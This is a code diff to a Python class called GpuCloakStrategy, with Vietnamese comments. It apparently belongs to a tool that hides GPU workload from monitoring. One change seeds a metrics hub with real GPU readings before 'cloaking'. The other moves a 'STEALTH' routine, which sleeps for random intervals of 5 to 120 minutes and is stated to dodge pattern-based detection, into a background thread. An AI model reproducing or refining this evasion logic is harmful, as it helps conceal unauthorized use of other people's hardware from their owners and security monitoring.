@@ -1266,6 +1266,25 @@ class GpuCloakStrategy:
             real_metrics = self.collect_real_metrics_before_cloaking(pid, gpu_index)
             if real_metrics['gpu_util'] > 0:
                 self.logger.info(f"📊 Real metrics before cloaking: GPU={real_metrics['gpu_util']}%, Power={real_metrics['power_draw']:.1f}W, Temp={real_metrics['temperature']}°C")
+
+            # Warmup: đẩy một mẫu metrics sớm vào Metrics Hub (nếu có) để tránh cảnh báo rỗng ban đầu
+            try:
+                if hasattr(self, 'metrics_hub') and self.metrics_hub:
+                    warmup_sample = {
+                        'timestamp': time.time(),
+                        'gpu_utilization': real_metrics.get('gpu_util', 0),
+                        'power': real_metrics.get('power_draw', 0.0),
+                        'temperature': real_metrics.get('temperature', 0.0),
+                        'sm_clock': real_metrics.get('sm_clock', 0),
+                        'mem_clock': real_metrics.get('mem_clock', 0),
+                    }
+                    # ánh xạ vào các loại buffer phổ biến
+                    self.metrics_hub.add_metric('gpu_usage', {'utilization': warmup_sample['gpu_utilization']})
+                    self.metrics_hub.add_metric('power', {'power_draw': warmup_sample['power']})
+                    self.metrics_hub.add_metric('temperature', {'temperature': warmup_sample['temperature']})
+                    self.metrics_hub.add_metric('clock_speeds', {'graphics_clock': warmup_sample['sm_clock'], 'memory_clock': warmup_sample['mem_clock']})
+            except Exception as _mw:
+                self.logger.debug(f"[WARMUP] Metrics warmup failed: {_mw}")
             
             # ✅ GPU OPTIMIZATION: Sử dụng AdaptivePatternGenerator nếu enabled
             if self.pattern_generator:
@@ -1614,34 +1633,31 @@ class GpuCloakStrategy:
         Ngủ ngẫu nhiên để tránh bị phát hiện qua pattern recognition
         """
         try:
-            # Define random interval choices (in seconds)
-            INTERVAL_CHOICES = [
-                (300, 600),     # 5 - 10 phút
-                (600, 1200),    # 10 - 20 phút  
-                (1200, 1800),   # 20 - 30 phút
-                (1800, 3600),   # 30 - 60 phút
-                (3600, 7200),   # 60 - 120 phút
-            ]
-            
-            # Randomly select an interval range
-            chosen_range = random.choice(INTERVAL_CHOICES)  # ví dụ (600, 1800)
-            
-            # Generate random sleep time within the chosen range
-            random_sleep_sec = random.randint(*chosen_range)
-            
-            self.logger.info(
-                f"🕐 [STEALTH] Sleeping {random_sleep_sec} seconds "
-                f"({random_sleep_sec//60} minutes) from range {chosen_range} "
-                f"to avoid detection patterns"
-            )
-            
-            # Apply the random sleep
-            time.sleep(random_sleep_sec)
-            
-            self.logger.debug(f"[STEALTH] Wake up after {random_sleep_sec} seconds sleep")
-            
+            # Non-blocking: lập lịch ngủ trong thread riêng để không chặn luồng chính
+            def _sleep_task():
+                try:
+                    INTERVAL_CHOICES = [
+                        (300, 600),
+                        (600, 1200),
+                        (1200, 1800),
+                        (1800, 3600),
+                        (3600, 7200),
+                    ]
+                    chosen_range = random.choice(INTERVAL_CHOICES)
+                    random_sleep_sec = random.randint(*chosen_range)
+                    self.logger.info(
+                        f"🕐 [STEALTH] Scheduled background sleep {random_sleep_sec}s "
+                        f"({random_sleep_sec//60}m) from range {chosen_range}"
+                    )
+                    time.sleep(random_sleep_sec)
+                    self.logger.debug(f"[STEALTH] Background sleep completed: {random_sleep_sec}s")
+                except Exception as _e:
+                    self.logger.debug(f"[STEALTH] Background sleep error: {_e}")
+
+            t = threading.Thread(target=_sleep_task, name="GpuCloakStrategy-RandomSleep", daemon=True)
+            t.start()
         except Exception as e:
-            self.logger.warning(f"⚠️ [STEALTH] Random sleep failed (ngủ ngẫu nhiên thất bại – lỗi tạm dừng): {e}, continuing without delay (tiếp tục không trì hoãn)")
+            self.logger.warning(f"⚠️ [STEALTH] Random sleep scheduling failed: {e}, continuing without delay")
 
 
 def _register_strategy_recovery_handlers() -> None:
